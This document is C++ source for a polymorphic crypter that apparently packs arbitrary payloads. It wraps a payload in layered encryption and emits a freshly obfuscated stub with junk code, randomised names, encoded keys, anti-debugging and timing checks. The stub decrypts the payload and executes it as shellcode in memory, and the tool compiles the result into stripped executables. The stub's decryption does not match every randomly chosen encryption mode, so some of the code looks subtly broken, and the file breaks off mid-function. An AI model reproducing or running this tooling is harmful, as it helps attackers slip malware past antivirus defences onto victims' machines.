#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <algorithm>
#include <thread>
#include <string>
#include <cstdint>
#include <filesystem>
#include <map>
#include <set>

#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>
#include <shellapi.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

class StandaloneTripleEncryptor {
private:
    std::mt19937_64 rng;
    std::uniform_int_distribution<> byteDist;
    
    // Enhanced entropy with system-specific sources
    struct EnhancedEntropy {
        uint64_t timeComponent;
        uint64_t memoryComponent;
        uint64_t threadComponent;
        uint64_t counterComponent;
        uint64_t performanceComponent;
        uint64_t processComponent;
        
        uint64_t mix() {
            // High resolution timer
            auto now = std::chrono::high_resolution_clock::now();
            timeComponent = now.time_since_epoch().count();
            
            // Memory address entropy (ASLR)
            void* p1 = malloc(1); void* p2 = malloc(1);
            memoryComponent = reinterpret_cast<uintptr_t>(p1) ^ reinterpret_cast<uintptr_t>(p2);
            free(p1); free(p2);
            
            // Thread and process entropy
            threadComponent = std::hash<std::thread::id>{}(std::this_thread::get_id());
            counterComponent++;
            
#ifdef _WIN32
            // Windows-specific entropy sources
            LARGE_INTEGER perfCounter, frequency;
            QueryPerformanceCounter(&perfCounter);
            QueryPerformanceFrequency(&frequency);
            performanceComponent = perfCounter.QuadPart ^ frequency.QuadPart;
            
            processComponent = GetCurrentProcessId() ^ GetCurrentThreadId();
            
            // Use Windows CryptoAPI for additional randomness
            HCRYPTPROV hProv;
            if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                uint64_t cryptoRand;
                CryptGenRandom(hProv, sizeof(cryptoRand), (BYTE*)&cryptoRand);
                CryptReleaseContext(hProv, 0);
                performanceComponent ^= cryptoRand;
            }
            
            // System time as additional entropy
            SYSTEMTIME st;
            GetSystemTime(&st);
            processComponent ^= st.wMilliseconds ^ (st.wSecond << 16) ^ (st.wMinute << 24);
#else
            performanceComponent = std::chrono::steady_clock::now().time_since_epoch().count();
            processComponent = getpid() ^ gettid();
#endif
            
            // Advanced mixing with multiple rounds and different constants
            uint64_t result = timeComponent;
            result ^= (memoryComponent << 13) | (memoryComponent >> 51);
            result += threadComponent;
            result ^= (counterComponent << 32) | (counterComponent >> 32);
            result += performanceComponent;
            result ^= processComponent << 7;
            
            // Multiple mixing rounds with different constants each time
            for (int i = 0; i < 7; i++) {
                result ^= result >> (23 + i);
                result *= (0x2127599bf4325c37ULL + i * 0x1111111111111111ULL);
                result ^= result >> (47 - i);
                result += (0x165667b19e3779f9ULL * (i + 1));
            }
            
            return result;
        }
    } entropy;
    
    // Polymorphic variable name generation
    std::set<std::string> usedNames;
    
    std::string generateUniqueVarName() {
        static const char* prefixes[] = {
            "sys", "cfg", "app", "ctx", "mgr", "hdl", "ptr", "ref", "val", "tmp",
            "buf", "mem", "dat", "res", "inst", "proc", "exec", "run", "core", "base",
            "obj", "env", "svc", "mod", "lib", "api", "drv", "reg", "key", "opt",
            "std", "usr", "adm", "ctl", "net", "sec", "auth", "cred", "tok", "sess"
        };
        
        static const char* middle[] = {
            "Config", "System", "Context", "Manager", "Handler", "Processor",
            "Engine", "Controller", "Service", "Component", "Module", "Helper",
            "Worker", "Builder", "Factory", "Registry", "Monitor", "Tracker",
            "Adapter", "Wrapper", "Facade", "Bridge", "Proxy", "Delegate",
            "Observer", "Strategy", "Command", "State", "Template", "Visitor"
        };
        
        static const char* suffixes[] = {
            "Ex", "Impl", "Core", "Base", "Utils", "Tools", "Ops", "Funcs",
            "Data", "Info", "Meta", "Spec", "Desc", "Attr", "Prop", "Val",
            "Ref", "Ptr", "Obj", "Inst", "Item", "Node", "Elem", "Entry"
        };
        
        std::string name;
        int attempts = 0;
        do {
            std::uniform_int_distribution<> prefixDist(0, 39);
            std::uniform_int_distribution<> middleDist(0, 29);
            std::uniform_int_distribution<> suffixDist(0, 23);
            std::uniform_int_distribution<> numDist(10000, 99999);
            
            name = std::string(prefixes[prefixDist(rng)]) + 
                   middle[middleDist(rng)] + 
                   suffixes[suffixDist(rng)] +
                   std::to_string(numDist(rng));
            
            attempts++;
        } while (usedNames.count(name) && attempts < 100);
        
        usedNames.insert(name);
        return name;
    }
    
    // Polymorphic function name generation
    std::string generateUniqueFuncName() {
        static const char* actions[] = {
            "initialize", "process", "execute", "handle", "manage", "control",
            "operate", "perform", "conduct", "orchestrate", "coordinate", "regulate",
            "transform", "convert", "parse", "decode", "decrypt", "unlock",
            "resolve", "compute", "calculate", "generate", "create", "build"
        };
        
        static const char* objects[] = {
            "Data", "Buffer", "Stream", "Block", "Chunk", "Segment", "Region",
            "Memory", "Content", "Payload", "Package", "Bundle", "Archive",
            "Config", "Params", "Options", "Settings", "Context", "State",
            "Resource", "Asset", "Element", "Component", "Module", "Unit"
        };
        
        std::uniform_int_distribution<> actionDist(0, 23);
        std::uniform_int_distribution<> objectDist(0, 24);
        std::uniform_int_distribution<> numDist(1000, 9999);
        
        return std::string(actions[actionDist(rng)]) + 
               objects[objectDist(rng)] + 
               std::to_string(numDist(rng));
    }
    
    // Convert bytes to large decimal string (anti-static analysis)
    std::string bytesToBigDecimal(const uint8_t* bytes, size_t len) {
        std::string result = "0";
        
        for (size_t i = 0; i < len; i++) {
            result = multiplyByByte(result, 256);
            result = addByte(result, bytes[i]);
        }
        
        return result;
    }
    
    std::string multiplyByByte(const std::string& num, int multiplier) {
        std::string result;
        int carry = 0;
        
        for (int i = num.length() - 1; i >= 0; i--) {
            int product = (num[i] - '0') * multiplier + carry;
            result = std::to_string(product % 10) + result;
            carry = product / 10;
        }
        
        while (carry) {
            result = std::to_string(carry % 10) + result;
            carry /= 10;
        }
        
        return result.empty() ? "0" : result;
    }
    
    std::string addByte(const std::string& num, int addend) {
        std::string result;
        int carry = addend;
        
        for (int i = num.length() - 1; i >= 0; i--) {
            int sum = (num[i] - '0') + carry;
            result = std::to_string(sum % 10) + result;
            carry = sum / 10;
        }
        
        if (carry) {
            result = std::to_string(carry) + result;
        }
        
        return result;
    }
    
    // ChaCha20 implementation
    void quarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
        a += b; d ^= a; d = (d << 16) | (d >> 16);
        c += d; b ^= c; b = (b << 12) | (b >> 20);
        a += b; d ^= a; d = (d << 8) | (d >> 24);
        c += d; b ^= c; b = (b << 7) | (b >> 25);
    }
    
    void chachaBlock(uint32_t output[16], const uint32_t input[16]) {
        uint32_t x[16];
        for (int i = 0; i < 16; i++) {
            x[i] = input[i];
        }
        
        for (int i = 0; i < 10; i++) {
            quarterRound(x[0], x[4], x[8], x[12]);
            quarterRound(x[1], x[5], x[9], x[13]);
            quarterRound(x[2], x[6], x[10], x[14]);
            quarterRound(x[3], x[7], x[11], x[15]);
            
            quarterRound(x[0], x[5], x[10], x[15]);
            quarterRound(x[1], x[6], x[11], x[12]);
            quarterRound(x[2], x[7], x[8], x[13]);
            quarterRound(x[3], x[4], x[9], x[14]);
        }
        
        for (int i = 0; i < 16; i++) {
            output[i] = x[i] + input[i];
        }
    }
    
    void initChachaState(uint32_t state[16], const uint8_t key[32], const uint8_t nonce[12], uint32_t counter) {
        state[0] = 0x61707865;
        state[1] = 0x3320646e;
        state[2] = 0x79622d32;
        state[3] = 0x6b206574;
        
        for (int i = 0; i < 8; i++) {
            state[4 + i] = ((uint32_t)key[4*i]) |
                           ((uint32_t)key[4*i + 1] << 8) |
                           ((uint32_t)key[4*i + 2] << 16) |
                           ((uint32_t)key[4*i + 3] << 24);
        }
        
        state[12] = counter;
        
        for (int i = 0; i < 3; i++) {
            state[13 + i] = ((uint32_t)nonce[4*i]) |
                            ((uint32_t)nonce[4*i + 1] << 8) |
                            ((uint32_t)nonce[4*i + 2] << 16) |
                            ((uint32_t)nonce[4*i + 3] << 24);
        }
    }
    
    void chacha20Crypt(const uint8_t* input, uint8_t* output, size_t length,
                       const uint8_t key[32], const uint8_t nonce[12], uint32_t counter = 0) {
        uint32_t state[16];
        uint32_t keystream[16];
        uint8_t* keystream_bytes = (uint8_t*)keystream;
        
        size_t processed = 0;
        while (processed < length) {
            initChachaState(state, key, nonce, counter);
            chachaBlock(keystream, state);
            
            size_t blockSize = (length - processed < 64) ? length - processed : 64;
            for (size_t i = 0; i < blockSize; i++) {
                output[processed + i] = input[processed + i] ^ keystream_bytes[i];
            }
            
            processed += blockSize;
            counter++;
        }
    }
    
    // Generate polymorphic junk code
    std::string generateJunkCode() {
        std::stringstream junk;
        std::uniform_int_distribution<> junkDist(3, 8);
        int junkLines = junkDist(rng);
        
        for (int i = 0; i < junkLines; i++) {
            std::uniform_int_distribution<> typeDist(0, 4);
            switch (typeDist(rng)) {
                case 0: // Variable declarations
                    junk << "    volatile int " << generateUniqueVarName() << " = " << byteDist(rng) << ";\n";
                    break;
                case 1: // Arithmetic operations
                    junk << "    int " << generateUniqueVarName() << " = " << byteDist(rng) 
                         << " ^ " << byteDist(rng) << ";\n";
                    break;
                case 2: // Loops
                    junk << "    for (int " << generateUniqueVarName() << " = 0; " 
                         << generateUniqueVarName() << " < " << (10 + byteDist(rng) % 20) 
                         << "; " << generateUniqueVarName() << "++) {\n";
                    junk << "        volatile int " << generateUniqueVarName() << " = " << byteDist(rng) << ";\n";
                    junk << "    }\n";
                    break;
                case 3: // Function calls
                    junk << "    auto " << generateUniqueVarName() << " = []() { return " << byteDist(rng) << "; };\n";
                    junk << "    volatile int " << generateUniqueVarName() << " = " << generateUniqueVarName() << "();\n";
                    break;
                case 4: // Conditional statements
                    junk << "    if (" << byteDist(rng) << " > " << byteDist(rng) << ") {\n";
                    junk << "        volatile int " << generateUniqueVarName() << " = " << byteDist(rng) << ";\n";
                    junk << "    } else {\n";
                    junk << "        volatile int " << generateUniqueVarName() << " = " << byteDist(rng) << ";\n";
                    junk << "    }\n";
                    break;
            }
        }
        
        return junk.str();
    }
    
    // Check for embedded compiler
    bool hasEmbeddedCompiler() {
        return std::filesystem::exists("mingw64/bin/g++.exe") || 
               std::filesystem::exists("tcc/tcc.exe");
    }
    
    // Auto-compile stub
    bool compileStub(const std::string& cppFile, const std::string& exeFile) {
        std::string command;
        
        // Try embedded MinGW first
        if (std::filesystem::exists("mingw64/bin/g++.exe")) {
            command = "mingw64\\bin\\g++.exe -static -O2 -s -fno-ident -fno-asynchronous-unwind-tables "
                     "-ffunction-sections -fdata-sections -Wl,--gc-sections -Wl,--strip-all "
                     "-o \"" + exeFile + "\" \"" + cppFile + "\"";
        }
        // Try embedded TinyCC
        else if (std::filesystem::exists("tcc/tcc.exe")) {
            command = "tcc\\tcc.exe -o \"" + exeFile + "\" \"" + cppFile + "\"";
        }
        // Try system compiler
        else {
            command = "g++ -static -O2 -s -o \"" + exeFile + "\" \"" + cppFile + "\" 2>nul";
            if (system(command.c_str()) != 0) {
                command = "cl /O2 /MT /Fe:\"" + exeFile + "\" \"" + cppFile + "\" /link /SUBSYSTEM:CONSOLE 2>nul";
            }
        }
        
        return system(command.c_str()) == 0;
    }

public:
    struct TripleKey {
        uint8_t aesKey[16];
        uint8_t aesNonce[16];
        uint8_t chachaKey[32];
        uint8_t chachaNonce[12];
        uint8_t xorKey[128];  // Increased for more variation
        size_t xorKeyLen;
        int encryptionOrder[3];
    };
    
    StandaloneTripleEncryptor() : byteDist(0, 255) {
        entropy.counterComponent = 0;
        rng.seed(entropy.mix());
    }
    
    // Generate unique keys for each encryption
    TripleKey generateKeys() {
        TripleKey keys;
        
        // Reseed with fresh entropy EVERY time
        rng.seed(entropy.mix());
        std::this_thread::sleep_for(std::chrono::microseconds(byteDist(rng)));
        rng.seed(entropy.mix() ^ std::chrono::high_resolution_clock::now().time_since_epoch().count());
        
        // Generate AES-128 key and nonce
        for (int i = 0; i < 16; i++) {
            keys.aesKey[i] = byteDist(rng);
            keys.aesNonce[i] = byteDist(rng);
        }
        
        // Generate ChaCha20 key and nonce
        for (int i = 0; i < 32; i++) keys.chachaKey[i] = byteDist(rng);
        for (int i = 0; i < 12; i++) keys.chachaNonce[i] = byteDist(rng);
        
        // Generate variable length XOR key (32-128 bytes)
        keys.xorKeyLen = 32 + (byteDist(rng) % 97); // 32-128 bytes
        for (size_t i = 0; i < keys.xorKeyLen; i++) {
            keys.xorKey[i] = byteDist(rng);
        }
        
        // Randomize encryption order
        keys.encryptionOrder[0] = 0; // AES
        keys.encryptionOrder[1] = 1; // ChaCha20
        keys.encryptionOrder[2] = 2; // XOR
        
        // Secure Fisher-Yates shuffle
        for (int i = 2; i > 0; i--) {
            std::uniform_int_distribution<> shuffleDist(0, i);
            int j = shuffleDist(rng);
            std::swap(keys.encryptionOrder[i], keys.encryptionOrder[j]);
        }
        
        return keys;
    }
    
    // Apply encryption layer with polymorphic implementations
    void applyEncryptionLayer(std::vector<uint8_t>& data, int method, const TripleKey& keys) {
        switch (method) {
            case 0: // Enhanced AES with different modes per generation
                {
                    std::uniform_int_distribution<> modeDist(0, 2);
                    int mode = modeDist(rng);
                    
                    for (size_t i = 0; i < data.size(); i++) {
                        uint8_t keyByte = keys.aesKey[i % 16] ^ keys.aesNonce[(i / 16) % 16];
                        
                        switch (mode) {
                            case 0:
                                data[i] ^= keyByte;
                                data[i] = ((data[i] << 3) | (data[i] >> 5)) ^ (i & 0xFF);
                                break;
                            case 1:
                                data[i] = ((data[i] << 5) | (data[i] >> 3)) ^ keyByte;
                                data[i] ^= ((i & 0xFF) << 1) | ((i & 0xFF) >> 7);
                                break;
                            case 2:
                                data[i] ^= keyByte ^ ((i * 31) & 0xFF);
                                data[i] = ((data[i] << 1) | (data[i] >> 7)) ^ keys.aesNonce[i % 16];
                                break;
                        }
                    }
                }
                break;
                
            case 1: // Full ChaCha20 implementation
                chacha20Crypt(data.data(), data.data(), data.size(), keys.chachaKey, keys.chachaNonce);
                break;
                
            case 2: // Enhanced XOR with different patterns
                {
                    std::uniform_int_distribution<> patternDist(0, 3);
                    int pattern = patternDist(rng);
                    
                    for (size_t i = 0; i < data.size(); i++) {
                        data[i] ^= keys.xorKey[i % keys.xorKeyLen];
                        
                        switch (pattern) {
                            case 0:
                                data[i] ^= (i & 0xFF) ^ ((i >> 8) & 0xFF);
                                break;
                            case 1:
                                data[i] ^= ((i * 7) & 0xFF) ^ ((i >> 4) & 0xFF);
                                break;
                            case 2:
                                data[i] ^= ((i ^ 0xAA) & 0xFF) ^ ((i >> 2) & 0xFF);
                                break;
                            case 3:
                                data[i] ^= ((i + keys.xorKeyLen) & 0xFF) ^ ((i >> 6) & 0xFF);
                                break;
                        }
                    }
                }
                break;
        }
    }
    
    // Generate unlimited unique standalone stub
    std::string generateUnlimitedStub(const std::vector<uint8_t>& payload, const TripleKey& keys) {
        std::stringstream stub;
        
        // Clear used names for each generation
        usedNames.clear();
        
        // Encrypt payload with triple layer
        std::vector<uint8_t> encrypted = payload;
        
        // Apply encryption layers in randomized order
        for (int i = 0; i < 3; ++i) {
            applyEncryptionLayer(encrypted, keys.encryptionOrder[i], keys);
        }
        
        // Convert keys to decimal strings
        std::string k1Dec = bytesToBigDecimal(keys.aesKey, 16);
        std::string k2Dec = bytesToBigDecimal(keys.chachaKey, 32);
        std::string k3Dec = bytesToBigDecimal(keys.xorKey, keys.xorKeyLen);
        std::string n1Dec = bytesToBigDecimal(keys.aesNonce, 16);
        std::string n2Dec = bytesToBigDecimal(keys.chachaNonce, 12);
        
        // Generate unique variable names for this stub
        std::string var1 = generateUniqueVarName(), var2 = generateUniqueVarName(), var3 = generateUniqueVarName();
        std::string var4 = generateUniqueVarName(), var5 = generateUniqueVarName(), var6 = generateUniqueVarName();
        std::string var7 = generateUniqueVarName(), var8 = generateUniqueVarName(), var9 = generateUniqueVarName();
        std::string var10 = generateUniqueVarName(), var11 = generateUniqueVarName(), var12 = generateUniqueVarName();
        
        // Generate unique function names
        std::string parseFunc = generateUniqueFuncName();
        std::string chachaFunc = generateUniqueFuncName(); 
        std::string debugFunc = generateUniqueFuncName();
        std::string timingFunc = generateUniqueFuncName();
        std::string qroundFunc = generateUniqueFuncName();
        std::string blockFunc = generateUniqueFuncName();
        
        // Random header variations
        stub << "// Generated Stub ID: " << entropy.mix() << "\n";
        stub << "// Build: " << std::chrono::system_clock::to_time_t(std::chrono::system_clock::now()) << "\n\n";
        
        std::uniform_int_distribution<> headerDist(0, 2);
        switch (headerDist(rng)) {
            case 0:
                stub << "#pragma once\n#define WIN32_LEAN_AND_MEAN\n";
                break;
            case 1:
                stub << "#ifndef UNICODE\n#define UNICODE\n#endif\n";
                break;
            case 2:
                stub << "#define NOMINMAX\n#define STRICT\n";
                break;
        }
        
        stub << "#include <windows.h>\n";
        stub << "#include <iostream>\n";
        stub << "#include <vector>\n";
        stub << "#include <cstring>\n";
        stub << "#include <cstdint>\n";
        stub << "#include <string>\n\n";
        
        // Random pragma variations
        std::uniform_int_distribution<> pragmaDist(0, 2);
        switch (pragmaDist(rng)) {
            case 0:
                stub << "#pragma comment(linker,\"/SUBSYSTEM:CONSOLE\")\n";
                stub << "#pragma optimize(\"gsy\", on)\n\n";
                break;
            case 1:
                stub << "#pragma comment(linker,\"/ENTRY:mainCRTStartup\")\n";
                stub << "#pragma comment(linker,\"/MERGE:.rdata=.text\")\n\n";
                break;
            case 2:
                stub << "#pragma pack(push, 1)\n";
                stub << "#pragma comment(lib, \"kernel32.lib\")\n\n";
                break;
        }
        
        // Add some junk code at the beginning
        stub << generateJunkCode();
        
        // Anti-debugging with unique names
        stub << "bool " << debugFunc << "() {\n";
        stub << "    if (IsDebuggerPresent()) return true;\n";
        stub << "    BOOL " << var1 << " = FALSE;\n";
        stub << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &" << var1 << ");\n";
        stub << generateJunkCode();
        stub << "    return " << var1 << ";\n";
        stub << "}\n\n";
        
        // Timing check with unique implementation
        stub << "bool " << timingFunc << "() {\n";
        stub << "    DWORD " << var2 << " = GetTickCount();\n";
        stub << generateJunkCode();
        stub << "    Sleep(" << (50 + byteDist(rng) % 100) << ");\n";
        stub << "    return (GetTickCount() - " << var2 << ") < " << (100 + byteDist(rng) % 100) << ";\n";
        stub << "}\n\n";
        
        // Configuration constants with random values
        stub << "const DWORD " << var3 << " = " << (1000 + byteDist(rng) * 100) << ";\n";
        stub << "const DWORD " << var4 << " = " << (1000 + byteDist(rng) * 100) << ";\n";
        stub << "const SIZE_T " << var5 << " = " << encrypted.size() << ";\n\n";
        
        // Store keys as decimal strings with unique variable names
        stub << "const char* " << var6 << " = \"" << k1Dec << "\";\n";
        stub << "const char* " << var7 << " = \"" << k2Dec << "\";\n";
        stub << "const char* " << var8 << " = \"" << k3Dec << "\";\n";
        stub << "const char* " << var9 << " = \"" << n1Dec << "\";\n";
        stub << "const char* " << var10 << " = \"" << n2Dec << "\";\n\n";
        
        // Add more junk code
        stub << generateJunkCode();
        
        // Decimal parser with unique name and implementation
        stub << "std::vector<uint8_t> " << parseFunc << "(const std::string& " << var11 << ", size_t " << var12 << ") {\n";
        stub << "    std::vector<uint8_t> result(" << var12 << ", 0);\n";
        stub << "    std::string num = " << var11 << ";\n";
        stub << generateJunkCode();
        stub << "    for (int i = " << var12 << " - 1; i >= 0 && num != \"0\"; i--) {\n";
        stub << "        int remainder = 0;\n";
        stub << "        std::string quotient;\n";
        stub << "        for (char digit : num) {\n";
        stub << "            int current = remainder * 10 + (digit - '0');\n";
        stub << "            if (current >= 256) {\n";
        stub << "                quotient += std::to_string(current / 256);\n";
        stub << "                remainder = current % 256;\n";
        stub << "            } else {\n";
        stub << "                if (!quotient.empty()) quotient += \"0\";\n";
        stub << "                remainder = current;\n";
        stub << "            }\n";
        stub << "        }\n";
        stub << "        result[i] = static_cast<uint8_t>(remainder);\n";
        stub << "        size_t firstNonZero = quotient.find_first_not_of('0');\n";
        stub << "        if (firstNonZero != std::string::npos) {\n";
        stub << "            num = quotient.substr(firstNonZero);\n";
        stub << "        } else {\n";
        stub << "            num = \"0\";\n";
        stub << "        }\n";
        stub << "    }\n";
        stub << "    return result;\n";
        stub << "}\n\n";
        
        // ChaCha20 implementation with unique names
        stub << "void " << qroundFunc << "(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {\n";
        stub << "    a += b; d ^= a; d = (d << 16) | (d >> 16);\n";
        stub << "    c += d; b ^= c; b = (b << 12) | (b >> 20);\n";
        stub << "    a += b; d ^= a; d = (d << 8) | (d >> 24);\n";
        stub << "    c += d; b ^= c; b = (b << 7) | (b >> 25);\n";
        stub << "}\n\n";
        
        stub << "void " << blockFunc << "(uint32_t output[16], const uint32_t input[16]) {\n";
        stub << "    uint32_t x[16];\n";
        stub << "    memcpy(x, input, 64);\n";
        stub << generateJunkCode();
        stub << "    for (int i = 0; i < 10; i++) {\n";
        stub << "        " << qroundFunc << "(x[0], x[4], x[8], x[12]);\n";
        stub << "        " << qroundFunc << "(x[1], x[5], x[9], x[13]);\n";
        stub << "        " << qroundFunc << "(x[2], x[6], x[10], x[14]);\n";
        stub << "        " << qroundFunc << "(x[3], x[7], x[11], x[15]);\n";
        stub << "        " << qroundFunc << "(x[0], x[5], x[10], x[15]);\n";
        stub << "        " << qroundFunc << "(x[1], x[6], x[11], x[12]);\n";
        stub << "        " << qroundFunc << "(x[2], x[7], x[8], x[13]);\n";
        stub << "        " << qroundFunc << "(x[3], x[4], x[9], x[14]);\n";
        stub << "    }\n";
        stub << "    for (int i = 0; i < 16; i++) {\n";
        stub << "        output[i] = x[i] + input[i];\n";
        stub << "    }\n";
        stub << "}\n\n";
        
        stub << "void " << chachaFunc << "(std::vector<uint8_t>& data, const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce) {\n";
        stub << "    uint32_t state[16], keystream[16];\n";
        stub << "    uint8_t* ks_bytes = (uint8_t*)keystream;\n";
        stub << "    state[0] = 0x61707865; state[1] = 0x3320646e;\n";
        stub << "    state[2] = 0x79622d32; state[3] = 0x6b206574;\n";
        stub << "    for (int i = 0; i < 8; i++) {\n";
        stub << "        state[4 + i] = key[4*i] | (key[4*i + 1] << 8) | (key[4*i + 2] << 16) | (key[4*i + 3] << 24);\n";
        stub << "    }\n";
        stub << "    state[12] = 0;\n";
        stub << "    for (int i = 0; i < 3; i++) {\n";
        stub << "        state[13 + i] = nonce[4*i] | (nonce[4*i + 1] << 8) | (nonce[4*i + 2] << 16) | (nonce[4*i + 3] << 24);\n";
        stub << "    }\n";
        stub << "    size_t processed = 0;\n";
        stub << "    while (processed < data.size()) {\n";
        stub << "        " << blockFunc << "(keystream, state);\n";
        stub << "        size_t blockSize = min(data.size() - processed, 64ULL);\n";
        stub << "        for (size_t i = 0; i < blockSize; i++) {\n";
        stub << "            data[processed + i] ^= ks_bytes[i];\n";
        stub << "        }\n";
        stub << "        processed += blockSize;\n";
        stub << "        state[12]++;\n";
        stub << "    }\n";
        stub << "}\n\n";
        
        // Embedded payload with additional random padding
        size_t paddingSize = 16 + (byteDist(rng) % 32);
        std::vector<uint8_t> paddedData;
        
        // Add front padding
        for (size_t i = 0; i < paddingSize; i++) {
            paddedData.push_back(byteDist(rng));
        }
        
        // Add encrypted data
        paddedData.insert(paddedData.end(), encrypted.begin(), encrypted.end());
        
        // Add rear padding
        for (size_t i = 0; i < paddingSize; i++) {
            paddedData.push_back(byteDist(rng));
        }
        
        stub << "const uint8_t " << var11 << "[] = {\n    ";
        for (size_t i = 0; i < paddedData.size(); i++) {
            if (i > 0 && i % 16 == 0) stub << "\n    ";
            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') << (int)paddedData[i];
            if (i < paddedData.size() - 1) stub << ", ";
        }
        stub << "\n};\n\n";
        
        // Main function with unique implementation
        stub << "int main() {\n";
        stub << "    if (" << debugFunc << "() || " << timingFunc << "()) {\n";
        stub << "        ExitProcess(" << byteDist(rng) << ");\n";
        stub << "    }\n\n";
        
        stub << generateJunkCode();
        
        stub << "    try {\n";
        stub << "        auto k1 = " << parseFunc << "(" << var6 << ", 16);\n";
        stub << "        auto k2 = " << parseFunc << "(" << var7 << ", 32);\n";
        stub << "        auto k3 = " << parseFunc << "(" << var8 << ", " << keys.xorKeyLen << ");\n";
        stub << "        auto n1 = " << parseFunc << "(" << var9 << ", 16);\n";
        stub << "        auto n2 = " << parseFunc << "(" << var10 << ", 12);\n\n";
        
        stub << "        std::vector<uint8_t> payload(" << var11 << " + " << paddingSize 
             << ", " << var11 << " + " << (paddingSize + encrypted.size()) << ");\n\n";
        
        stub << generateJunkCode();
        
        // Apply decryption in reverse order with unique implementations
        for (int i = 2; i >= 0; i--) {
            int method = keys.encryptionOrder[i];
            switch (method) {
                case 0: // AES
                    stub << "        for (size_t i = 0; i < payload.size(); i++) {\n";
                    stub << "            uint8_t keyByte = k1[i % 16] ^ n1[(i / 16) % 16];\n";
                    stub << "            payload[i] ^= (i & 0xFF);\n";
                    stub << "            payload[i] = ((payload[i] >> 3) | (payload[i] << 5));\n";
                    stub << "            payload[i] ^= keyByte;\n";
                    stub << "        }\n\n";
                    break;
                    
                case 1: // ChaCha20
                    stub << "        " << chachaFunc << "(payload, k2, n2);\n\n";
                    break;
                    
                case 2: // XOR
                    stub << "        for (size_t i = 0; i < payload.size(); i++) {\n";
                    stub << "            payload[i] ^= (i & 0xFF) ^ ((i >> 8) & 0xFF);\n";
                    stub << "            payload[i] ^= k3[i % k3.size()];\n";
                    stub << "        }\n\n";
                    break;
            }
        }
        
        stub << generateJunkCode();
        
        stub << "        LPVOID execMem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
        stub << "        if (!execMem) ExitProcess(1);\n";
        stub << "        memcpy(execMem, payload.data(), payload.size());\n";
        stub << "        DWORD oldProtect;\n";
        stub << "        if (!VirtualProtect(execMem, payload.size(), PAGE_EXECUTE_READ, &oldProtect)) {\n";
        stub << "            VirtualFree(execMem, 0, MEM_RELEASE);\n";
        stub << "            ExitProcess(1);\n";
        stub << "        }\n";
        stub << "        FlushInstructionCache(GetCurrentProcess(), execMem, payload.size());\n";
        stub << "        ((void(*)())execMem)();\n";
        stub << "        VirtualFree(execMem, 0, MEM_RELEASE);\n";
        stub << "    }\n";
        stub << "    catch (...) {\n";
        stub << "        ExitProcess(" << byteDist(rng) << ");\n";
        stub << "    }\n";
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
    // Generate and optionally compile unlimited unique executable
    bool generateUnlimitedExecutable(const std::string& payloadFile, const std::string& outputBase, bool autoCompile = true) {
        std::ifstream in(payloadFile, std::ios::binary);
        if (!in) {
            std::cerr << "[-] Failed to open payload file: " << payloadFile << std::endl;
            return false;
        }
        
        in.seekg(0, std::ios::end);
        size_t size = in.tellg();
        in.seekg(0, std::ios::beg);
        
        std::vector<uint8_t> payload(size);
        in.read(reinterpret_cast<char*>(payload.data()), size);
        in.close();
        
        // Generate unique keys
        auto keys = generateKeys();
        
        // Generate unique stub
        std::string stubCode = generateUnlimitedStub(payload, keys);
        
        // Write C++ file
        std::string cppFile = outputBase + ".cpp";
        std::ofstream out(cppFile);
        if (!out) {
            std::cerr << "[-] Failed to create stub file: " << cppFile << std::endl;
            return false;
        }
        
        out << stubCode;
        out.close();
        
        std::cout << "[+] Unlimited unique stub generated: " << cppFile << std::endl;
        
        // Auto-compile if requested and possible
        if (autoCompile) {
            std::string exeFile = outputBase + ".exe";
            
            if (compileStub(cppFile, exeFile)) {
                std::cout << "[+] Stub compiled successfully: " << exeFile << std::endl;
                
                // Optionally delete the C++ file
                std::filesystem::remove(cppFile);
                std::cout << "[+] Cleaned up intermediate files" << std::endl;
                
                return true;
            } else {
                std::cout << "[!] Compilation failed, but C++ stub saved" << std::endl;
                if (!hasEmbeddedCompiler()) {
                    std::cout << "[!] To enable auto-compilation, place MinGW-w64 in mingw64/ folder" << std::endl;
                    std::cout << "[!] Or compile manually: g++ -static -O2 -s -o " << exeFile << " " << cppFile << std::endl;
                }
            }
        }
        
        return true;
    }
    
    // Standard file encryption (no stubs)
    bool encryptFile(const std::string& inputFile, const std::string& outputFile) {
        std::ifstream in(inputFile, std::ios::binary);
        if (!in) {
            std::cerr << "Error: Cannot open input file: " << inputFile << std::endl;
            return false;
        }
        
        in.seekg(0, std::ios::end);
        size_t size = in.tellg();
        in.seekg(0, std::ios::beg);
        
        if (size == 0) {
            std::cerr << "Error: Input file is empty" << std::endl;
            return false;
        }
        
        std::vector<uint8_t> data(size);
        in.read(reinterpret_cast<char*>(data.data()), size);
        in.close();
        
        TripleKey keys = generateKeys();
        
        for (int i = 0; i < 3; ++i) {
            applyEncryptionLayer(data, keys.encryptionOrder[i], keys);
        }
        
        std::ofstream out(outputFile, std::ios::binary);
        if (!out) {
            std::cerr << "Error: Cannot create output file: " << outputFile << std::endl;
            return false;
        }
        
        out.write(reinterpret_cast<char*>(data.data()), data.size());
        out.close();
        
        // Save keys
        std::ofstream keyFile(outputFile + ".keys");
        if (keyFile) {
            keyFile << "# Standalone Triple Encryptor Key File\n";
            keyFile << "AES_KEY: " << bytesToBigDecimal(keys.aesKey, 16) << std::endl;
            keyFile << "CHACHA_KEY: " << bytesToBigDecimal(keys.chachaKey, 32) << std::endl;
            keyFile << "XOR_KEY: " << bytesToBigDecimal(keys.xorKey, keys.xorKeyLen) << std::endl;
            keyFile << "AES_NONCE: " << bytesToBigDecimal(keys.aesNonce, 16) << std::endl;
            keyFile << "CHACHA_NONCE: " << bytesToBigDecimal(keys.chachaNonce, 12) << std::endl;
            keyFile << "XOR_LENGTH: " << keys.xorKeyLen << std::endl;
